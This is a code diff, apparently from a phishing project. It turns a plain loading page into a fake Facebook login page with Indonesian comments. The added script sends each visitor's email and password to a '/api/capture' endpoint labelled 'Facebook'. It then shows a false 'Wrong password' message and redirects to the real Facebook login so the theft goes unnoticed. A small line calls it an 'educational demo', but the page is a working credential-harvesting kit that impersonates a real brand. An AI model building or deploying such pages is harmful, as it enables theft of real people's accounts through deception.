@@ -1,43 +1,188 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
-    <meta name="description" content="Connect with people around you">
-    <meta name="robots" content="noindex, nofollow">
-    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%231877f2'/%3E%3Ctext x='50' y='68' text-anchor='middle' fill='white' font-size='55' font-family='Arial'%3Ef%3C/text%3E%3C/svg%3E">
-    
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-    
+    <title>Facebook - Log In</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #f0f2f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
         }
-        #root { display: none; }
-        #loading {
-            width: 35px;
-            height: 35px;
-            border: 3px solid #e0e0e0;
-            border-top-color: #1877f2;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+        .container {
+            display: flex;
+            max-width: 980px;
+            width: 100%;
+            gap: 40px;
+            align-items: center;
+            flex-wrap: wrap;
+            justify-content: center;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .left {
+            flex: 1;
+            min-width: 300px;
+            text-align: left;
+        }
+        .left h1 {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .left p {
+            color: #1c1e21;
+            font-size: 24px;
+            line-height: 28px;
+        }
+        .right {
+            flex: 1;
+            min-width: 300px;
+        }
+        .login-box {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 6px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .login-box input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: 0.3s;
+        }
+        .btn-login:hover { background: #166fe5; }
+        .forgot {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 15px 0;
+            display: block;
+        }
+        .forgot:hover { text-decoration: underline; }
+        hr {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .btn-new {
+            padding: 14px 20px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-new:hover { background: #36a420; }
+        .error-msg {
+            color: #ff3333;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            padding: 10px;
+            background: #ffebee;
+            border-radius: 5px;
+        }
+        @media (max-width: 768px) {
+            .left { text-align: center; }
+            .left h1 { font-size: 40px; }
+            .left p { font-size: 18px; }
+        }
     </style>
 </head>
 <body>
-    <div id="loading"></div>
-    <div id="root"></div>
-    
-    <script src="core.js"></script>
+    <div class="container">
+        <!-- Left Side -->
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+
+        <!-- Right Side - Login Form -->
+        <div class="right">
+            <div class="login-box">
+                <form id="loginForm">
+                    <input type="text" id="email" name="email" placeholder="Email or phone number" required autocomplete="off">
+                    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
+                    <button type="submit" class="btn-login">Log In</button>
+                </form>
+                
+                <div class="error-msg" id="errorMsg">
+                    ⚠️ Wrong password! Please try again.
+                </div>
+                
+                <a href="#" class="forgot">Forgot password?</a>
+                <hr>
+                <button class="btn-new">Create new account</button>
+            </div>
+            <p style="text-align:center;margin-top:20px;font-size:14px;color:#666;">
+                <b>⚠️ EDUCATIONAL DEMO ONLY!</b><br>
+                This is a security research tool.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Kirim ke API
+            try {
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: "Facebook",
+                        username: email,
+                        password: password
+                    })
+                });
+            } catch (err) {
+                console.log('Capture done');
+            }
+            
+            // Tampilkan error
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('loginForm').reset();
+            
+            // Redirect ke Facebook asli setelah 3 detik
+            setTimeout(function() {
+                window.location.href = 'https://www.facebook.com/login/';
+            }, 3000);
+        });
+    </script>
 </body>
 </html>
